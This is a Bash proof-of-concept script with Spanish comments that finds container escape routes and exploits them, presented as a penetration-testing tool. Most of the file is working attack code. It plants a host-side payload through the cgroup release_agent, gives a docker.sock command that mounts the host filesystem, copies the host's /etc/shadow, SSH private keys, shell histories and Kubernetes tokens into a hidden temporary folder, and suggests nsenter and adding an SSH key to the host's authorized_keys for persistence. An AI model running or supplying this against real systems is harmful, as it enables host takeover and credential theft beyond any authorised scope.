#!/bin/bash
# poc_container_escape.sh
# Enumera vectores de escape de contenedor (Docker/K8s/LXC) y, si existe
# uno explotable, intenta pivotar a una shell en el host como usuario normal.
# USO: solo en contenedores autorizados durante un pentest.

C_GREEN='\033[0;32m'; C_RED='\033[0;31m'; C_YEL='\033[0;33m'; C_END='\033[0m'
ok()   { echo -e "${C_GREEN}[+]${C_END} $1"; }
bad()  { echo -e "${C_RED}[-]${C_END} $1"; }
warn() { echo -e "${C_YEL}[!]${C_END} $1"; }

echo "=============================================="
echo " Enumeracion de escape de contenedor - $(hostname)"
echo "=============================================="

IN_CONTAINER=0
[ -f /.dockerenv ] && IN_CONTAINER=1 && ok "/.dockerenv presente: estamos en Docker"
if grep -qE '(docker|kubepods|lxc|containerd)' /proc/1/cgroup 2>/dev/null; then
    IN_CONTAINER=1
    ok "cgroups del PID 1 apuntan a un contenedor: $(head -1 /proc/1/cgroup)"
fi
if [ "$IN_CONTAINER" -eq 0 ]; then
    warn "No parece que estemos dentro de un contenedor. Saliendo."
    exit 1
fi

echo
echo "---------- Contexto ----------"
echo "[*] Usuario actual: $(id 2>/dev/null)"
echo "[*] Kernel: $(uname -r)"
echo "[*] Mounts interesantes:"
grep -E 'docker|kubepods|host|/proc|/sys' /proc/mounts 2>/dev/null | head -15

echo
echo "---------- Chequeo de vectores de escape ----------"

EXPLOIT_DIR="/tmp/.escape_poc_$$"
mkdir -p "$EXPLOIT_DIR"

# ---------- 1. Contenedor privilegiado (release_agent) ----------
RELEASE_AGENT=""
for f in /sys/fs/cgroup/release_agent /sys/fs/cgroup/*/release_agent /host/sys/fs/cgroup/release_agent; do
    [ -w "$f" ] && RELEASE_AGENT="$f" && break
done

if [ -n "$RELEASE_AGENT" ]; then
    ok "release_agent escribible: $RELEASE_AGENT -> escape via cgroup privilegiado"
    cat > "$EXPLOIT_DIR/host_cmd.sh" <<'EOS'
#!/bin/sh
/bin/ls -la /home > /tmp/.escape_poc_output 2>&1
/bin/id >> /tmp/.escape_poc_output 2>&1
EOS
    chmod +x "$EXPLOIT_DIR/host_cmd.sh"

    OVERLAY_UPPER=$(grep ' / / ' /proc/mounts 2>/dev/null | grep -oP 'upperdir=\K[^,]+')
    if [ -n "$OVERLAY_UPPER" ]; then
        HOST_SCRIPT="$OVERLAY_UPPER$EXPLOIT_DIR/host_cmd.sh"
        echo "$HOST_SCRIPT" > "$RELEASE_AGENT"
        echo 1 > /sys/fs/cgroup/notify_on_release 2>/dev/null || echo 1 > /sys/fs/cgroup/*/notify_on_release 2>/dev/null
        sh -c 'sleep 1 & wait $!; kill -9 $! 2>/dev/null'
        warn "Payload plantado via release_agent. Al morir un proceso del cgroup se ejecuta en el host."
        warn "Salida en /tmp/.escape_poc_output del HOST."
    else
        warn "No se pudo resolver el upperdir del overlay; release_agent requiere mapear la ruta del host."
    fi
else
    bad "release_agent no escribible (contenedor sin privilegios)"
fi

# ---------- 2. Docker socket montado ----------
if [ -S /var/run/docker.sock ]; then
    ok "/var/run/docker.sock accesible -> escape trivial montando el FS del host"
    if command -v curl >/dev/null 2>&1; then
        warn "Demo: listar imagenes via API de Docker"
        curl -s --unix-socket /var/run/docker.sock http://localhost/images/json 2>/dev/null | head -c 400; echo
    fi
    cat <<'EOF'
    Escape real:
      docker -H unix:///var/run/docker.sock run -v /:/host --privileged -it alpine chroot /host sh
    Con curl: POST /containers/create con Binds=["/:/host"] y luego /start + /exec.
EOF
else
    bad "docker.sock no presente"
fi

# ---------- 3. Mounts del host expuestos ----------
grep -E '( ext[234]| xfs )' /proc/mounts 2>/dev/null | grep -vE 'overlay|/dev/shm' | while read -r line; do
    warn "Montaje de disco del host visible: $line"
done

HOSTFS=$(grep -E '/host|/rootfs|/hostfs|kubelet-pods' /proc/mounts 2>/dev/null | awk '{print $2}' | head -3)
if [ -n "$HOSTFS" ]; then
    ok "Rutas tipo hostPath montadas: $HOSTFS"
    for m in $HOSTFS; do
        if [ -r "$m/etc/shadow" ]; then
            ok "LECTURA de $m/etc/shadow posible -> hashes del host disponibles"
            cp "$m/etc/shadow" "$EXPLOIT_DIR/host_shadow_leak" 2>/dev/null
        fi
        if [ -w "$m/etc/" ] && [ -d "$m/home" ]; then
            ok "ESCRITURA en FS del host via $m -> inyectar en authorized_keys o cron del host"
        fi
    done
fi

# ---------- 4. Capacidades peligrosas ----------
if command -v capsh >/dev/null 2>&1; then
    capsh --print 2>/dev/null | grep -E 'Current:' | sed 's/^/[cap] /'
else
    grep CapEff /proc/self/status 2>/dev/null | sed 's/^/[cap] /'
fi
CAPS_RAW=$(grep CapEff /proc/self/status 2>/dev/null | awk '{print $2}')
if [ -n "$CAPS_RAW" ]; then
    CAPS_DEC=$((16#$CAPS_RAW))
    [ $((CAPS_DEC & 0x200000)) -ne 0 ] && ok "CAP_SYS_ADMIN presente -> escape posible via mount/namespace"
    [ $((CAPS_DEC & 0x4)) -ne 0 ] && warn "CAP_DAC_READ_SEARCH presente -> lectura arbitraria de archivos (Shocker)"
fi

# ---------- 5. PID namespace compartido con el host ----------
for p in $(ls /proc 2>/dev/null | grep -E '^[0-9]+$' | head -40); do
    CMD=$(tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null | head -c 80)
    case "$CMD" in
        *dockerd*|*kubelet*|*sshd*)
            ok "Proceso del host visible via hostPID: PID $p -> $CMD"
            warn "Escape hostPID: usar nsenter -t $p -m -u -i -n -p para caer en el host."
            ;;
    esac
done

# ---------- 6. Credenciales reutilizables hacia el host ----------
warn "Buscando credenciales que sirvan para SSH al host como usuario normal..."
for f in /root/.ssh/id_* /home/*/.ssh/id_* /root/.ssh/known_hosts /home/*/.ssh/known_hosts /root/.bash_history /home/*/.bash_history /var/run/secrets/kubernetes.io/serviceaccount/token; do
    [ -r "$f" ] && ok "Archivo sensible legible: $f" && cp "$f" "$EXPLOIT_DIR/" 2>/dev/null
done

# ---------- 7. Kernel y exploits conocidos ----------
KREL=$(uname -r)
warn "Kernel $KREL: contrasta contra exploits de escape (DirtyPipe CVE-2022-0847,"
warn "  CVE-2022-0185 con CAP_SYS_ADMIN, runc CVE-2019-5736 si puedes sobrescribir el binario runc)."

echo
echo "=============================================="
echo " Resumen"
echo "=============================================="
echo "[*] Artefactos recolectados en: $EXPLOIT_DIR"
echo "[*] Si aparecio docker.sock, hostPath escribible o release_agent:"
echo "    escape al host confirmado. Siguiente paso: escribir tu clave"
echo "    publica en /root/.ssh/authorized_keys del HOST y conectar por"
echo "    SSH como usuario normal del servidor."
exit 0
